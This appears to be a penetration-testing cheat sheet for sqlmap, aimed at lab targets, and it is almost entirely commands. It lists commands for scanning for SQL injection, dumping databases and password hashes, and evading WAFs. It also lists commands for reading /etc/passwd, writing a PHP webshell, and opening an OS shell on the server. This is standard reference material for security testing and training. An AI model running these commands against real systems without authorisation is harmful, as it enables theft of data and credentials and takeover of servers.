---
type: tool
category: web, exploitation
tags: [sqli, sqlmap, database, web, injection]
source: teamghsoftware/security-cheatsheets
---

## What it is
sqlmap automates SQL injection detection and exploitation. Feed it a URL or a captured request from Burp and it does the heavy lifting — finding injectable parameters, dumping databases, and in some cases getting a shell.

## Basic usage

```bash
# Scan a URL (GET parameter)
sqlmap -u "http://target.htb/page?id=1"

# Scan from a Burp-captured request file
sqlmap -r request.txt

# Automated full scan with forms, crawling
sqlmap -u http://target.htb --forms --batch --crawl=2 --level=5 --risk=3
```

## Reconnaissance

```bash
# Get database banner
sqlmap -u <url> --banner

# Fingerprint DBMS
sqlmap -u <url> --fingerprint

# Get current user, DB, hostname
sqlmap -u <url> --current-user --current-db --hostname

# Check if current DB user is admin
sqlmap -u <url> --is-dba

# Identify WAF
sqlmap -u <url> --identify-waf

# List all databases
sqlmap -u <url> --dbs
```

## Data extraction

```bash
# List tables in a database
sqlmap -u <url> -D <db> --tables

# List columns in a table
sqlmap -u <url> -D <db> -T <table> --columns

# Dump a specific column
sqlmap -u <url> -D <db> -T <table> -C <column> --dump

# Dump all users and password hashes
sqlmap -u <url> --users --passwords
```

## Evasion

```bash
# Random User-Agent
sqlmap -u <url> --random-agent

# Use a tamper script (e.g. spaces to comments)
sqlmap -u <url> --tamper=space2comment

# Route through Burp proxy
sqlmap -u <url> --proxy=http://127.0.0.1:8080
```

## OS access (if DB user has FILE privilege)

```bash
# Read a file from the server
sqlmap -u <url> --file-read="/etc/passwd"

# Write a webshell (if writable web dir)
sqlmap -u <url> --file-write=shell.php --file-dest=/var/www/html/shell.php

# OS shell (interactive)
sqlmap -u <url> --os-shell
```

## Tips

- Use `-r request.txt` (from Burp) to include cookies, POST data, and headers automatically
- `--batch` answers all prompts with default (yes to everything) — good for automation
- `--level` 1–5 controls test thoroughness; `--risk` 1–3 controls how aggressive (3 may modify data)

## Related
- [[Burp Suite]]
- [[Pentest Web Cheatsheet]]
